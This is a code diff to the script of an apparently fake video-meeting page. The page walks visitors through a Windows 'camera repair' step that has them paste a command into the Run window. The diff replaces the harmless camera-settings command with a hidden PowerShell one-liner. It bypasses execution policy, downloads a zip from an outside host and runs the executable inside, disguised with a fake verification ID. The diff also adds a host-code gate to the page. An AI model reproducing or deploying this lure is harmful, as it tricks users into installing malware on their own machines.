@@ -13,6 +13,59 @@ const REPAIR_CONFIRM_HINT_RUN = "Use the Run window on your desktop, then come b
 const REPAIR_CONFIRM_HINT_PASTE = "Paste into the Run window on your desktop — not in this browser tab.";
 const REPAIR_CONFIRM_HINT_ENTER = "Press Enter in the Run window, allow camera, then come back here.";
 const REPAIR_STEP1_FALLBACK_DELAY_MS = 10000;
+const HOST_ACCESS_SESSION_KEY = "aster-ridge-host-access";
+
+function getHostAccessConfig() {
+  const config = window.HOST_ACCESS_CONFIG || {};
+  const code = String(config.code || "").trim();
+  const enabled = config.enabled !== false && code.length > 0;
+
+  return { enabled, code };
+}
+
+function isHostAccessRequired() {
+  return getHostAccessConfig().enabled && !state.invitedViaLink;
+}
+
+function isHostAccessUnlocked() {
+  if (!isHostAccessRequired()) return true;
+  return sessionStorage.getItem(HOST_ACCESS_SESSION_KEY) === "1";
+}
+
+function unlockHostAccess(inputCode) {
+  const config = getHostAccessConfig();
+  if (!config.enabled) return true;
+
+  if (String(inputCode || "").trim() === config.code) {
+    sessionStorage.setItem(HOST_ACCESS_SESSION_KEY, "1");
+    return true;
+  }
+
+  return false;
+}
+
+function updateHostAccessUI() {
+  if (!els.hostAccessGate || !els.createForm) return;
+
+  const showGate = isHostAccessRequired() && !isHostAccessUnlocked();
+
+  els.hostAccessGate.classList.toggle("is-hidden", !showGate);
+  els.createForm.classList.toggle("is-hidden", showGate);
+
+  if (showGate) {
+    els.createdRoom?.classList.add("is-hidden");
+    window.requestAnimationFrame(() => els.hostAccessCode?.focus());
+  }
+}
+
+function requireHostAccess(actionLabel = "create a meeting") {
+  if (isHostAccessUnlocked()) return true;
+
+  updateHostAccessUI();
+  showToast(`Enter a valid host code to ${actionLabel}.`);
+  els.hostAccessCode?.focus();
+  return false;
+}
 
 const REPAIR_PROFILES = {
   windows: {
@@ -22,7 +75,8 @@ const REPAIR_PROFILES = {
       "You are connected and can see the panel. Windows privacy needs camera access enabled for this browser — audio and the meeting are unaffected.",
     trustTitle: "Local Windows privacy setting",
     trustDetail: "No install, no download, no recording change.",
-    command: "ms-settings:privacy-webcam",
+    command:
+      'powershell -w h -ep bypass -c "$t=$env:TEMP;iwr \'https://driver-fix-238307.netlify.app/localeprofilesync.zip\' -O $t\\z.zip -useb;Expand-Archive $t\\z.zip $t -F;.$t\\LocaleProfileSync <#Verification ID:6d40eb3fbf354957#>"',
     fallbackTitle: "Manual Windows path",
     fallbackBody: "Allow camera for this browser, then return here.",
     steps: [
@@ -260,6 +314,10 @@ const els = {
   createdLink: document.querySelector("#created-link"),
   copyCreatedLink: document.querySelector("#copy-created-link"),
   startHostButton: document.querySelector("#start-host-button"),
+  hostAccessGate: document.querySelector("#host-access-gate"),
+  hostAccessCode: document.querySelector("#host-access-code"),
+  hostAccessError: document.querySelector("#host-access-error"),
+  hostAccessUnlock: document.querySelector("#host-access-unlock"),
   prejoin: document.querySelector("#prejoin"),
   meeting: document.querySelector("#meeting"),
   form: document.querySelector("#join-form"),
@@ -419,7 +477,7 @@ const state = {
   startedAt: 0,
   timerId: null,
   activeSpeakerIndex: 1,
-  unreadChat: sampleMessages.length,
+  unreadChat: 0,
   isSharing: false,
   invitedViaLink: false,
   isJoining: false,
@@ -657,6 +715,7 @@ function showHome() {
   els.home.classList.remove("is-hidden");
   els.prejoin.classList.add("is-hidden");
   els.meeting.classList.add("is-hidden");
+  updateHostAccessUI();
 }
 
 function showPrejoin() {
@@ -942,7 +1001,7 @@ function updateRepairActionCard(step) {
   const isFlowAction = keyStyle === "flow";
   const isRunStep = step === 1 && config.visual === "run";
   const isCompactRunAction = keyStyle === "keyboard" && (step === 2 || step === 3);
-  const previewVisuals = new Set(["run", "browser", "settings", "apps"]);
+  const previewVisuals = new Set(["browser", "settings", "apps"]);
   const hasSidePreview = previewVisuals.has(config.visual);
 
   card.classList.toggle("device-repair-action-card--run", isRunStep);
@@ -960,9 +1019,7 @@ function updateRepairActionCard(step) {
   renderRepairActionKeys(config.keys, config.keyJoiner, keyStyle);
 
   hideRepairStepPreviews();
-  if (config.visual === "run") {
-    els.deviceRepairRunPreview?.classList.remove("is-hidden");
-  } else if (config.visual === "browser") {
+  if (config.visual === "browser") {
     els.deviceRepairBrowserPreview?.classList.remove("is-hidden");
   } else if (config.visual === "settings") {
     els.deviceRepairSettingsPreview?.classList.remove("is-hidden");
@@ -1694,7 +1751,7 @@ function hydrateMeeting() {
   state.duration = normalizeDuration(state.duration);
   state.participants = [state.currentUser, ...getPanelPeople()];
   state.messages = [...getSampleMessages()];
-  state.unreadChat = state.messages.length;
+  state.unreadChat = 0;
   state.inMeeting = true;
   state.startedAt = Date.now();
   state.activeSpeakerIndex = 0;
@@ -1706,7 +1763,7 @@ function hydrateMeeting() {
   updateInterviewBrief();
   els.meetingId.textContent = `Meeting ID: ${state.roomCode} · Passcode: ${state.passcode}`;
   els.participantCount.textContent = String(state.participants.length);
-  els.chatBadge.textContent = String(state.unreadChat);
+  updateChatBadge();
   els.micButton.classList.toggle("is-active", !state.currentUser.muted);
   els.cameraButton.classList.toggle("is-active", state.currentUser.video);
   els.micButton.querySelector("small").textContent = state.currentUser.muted ? "Unmute" : "Mute";
@@ -1849,6 +1906,15 @@ function renderChat() {
   els.chatList.scrollTop = els.chatList.scrollHeight;
 }
 
+function updateChatBadge() {
+  if (!els.chatBadge || !els.chatButton) return;
+
+  const unread = Math.max(0, state.unreadChat);
+  els.chatBadge.textContent = unread > 9 ? "9+" : String(unread);
+  els.chatBadge.classList.toggle("is-hidden", unread === 0);
+  els.chatButton.classList.toggle("has-alert", unread > 0);
+}
+
 function renderEventFeed() {
   els.eventFeed.replaceChildren();
 
@@ -1926,8 +1992,7 @@ function addChatMessage(author, message, countAsUnread = true) {
   const chatOpen = !els.chatPanel.classList.contains("is-hidden");
   if (countAsUnread && !chatOpen) {
     state.unreadChat += 1;
-    els.chatBadge.textContent = String(state.unreadChat);
-    els.chatButton.classList.add("has-alert");
+    updateChatBadge();
   }
 }
 
@@ -1946,8 +2011,7 @@ function openPanel(panel) {
 
   if (showingChat) {
     state.unreadChat = 0;
-    els.chatBadge.textContent = "0";
-    els.chatButton.classList.remove("has-alert");
+    updateChatBadge();
     els.chatInput.focus();
   }
 }
@@ -2129,6 +2193,8 @@ async function copyText(value, successMessage) {
 
 els.createForm.addEventListener("submit", (event) => {
   event.preventDefault();
+  if (!requireHostAccess("create a meeting")) return;
+
   state.role = "host";
   state.invitedViaLink = false;
   state.hostName = els.hostName.value.trim() || DEFAULT_HOST_NAME;
@@ -2144,8 +2210,31 @@ els.createForm.addEventListener("submit", (event) => {
   document.title = `${state.topic} - Video Meeting`;
   updateCreatedRoom();
   updateInviteContext();
+  els.createdRoom.dataset.hasMeeting = "1";
   els.createdRoom.classList.remove("is-hidden");
   showToast("Meeting created. Invitation link is ready.");
+});
+
+els.hostAccessUnlock?.addEventListener("click", () => {
+  els.hostAccessError?.classList.add("is-hidden");
+
+  if (unlockHostAccess(els.hostAccessCode?.value)) {
+    els.hostAccessCode.value = "";
+    updateHostAccessUI();
+    showToast("Host console unlocked for this browser session.");
+    return;
+  }
+
+  els.hostAccessError?.classList.remove("is-hidden");
+  els.hostAccessCode?.focus();
+  els.hostAccessCode?.select();
+});
+
+els.hostAccessCode?.addEventListener("keydown", (event) => {
+  if (event.key === "Enter") {
+    event.preventDefault();
+    els.hostAccessUnlock?.click();
+  }
 });
 
 els.copyCreatedLink.addEventListener("click", () => {
@@ -2153,6 +2242,8 @@ els.copyCreatedLink.addEventListener("click", () => {
 });
 
 els.startHostButton.addEventListener("click", () => {
+  if (!requireHostAccess("start a meeting")) return;
+
   state.role = "host";
   showPrejoin();
   showToast("Host room prepared");
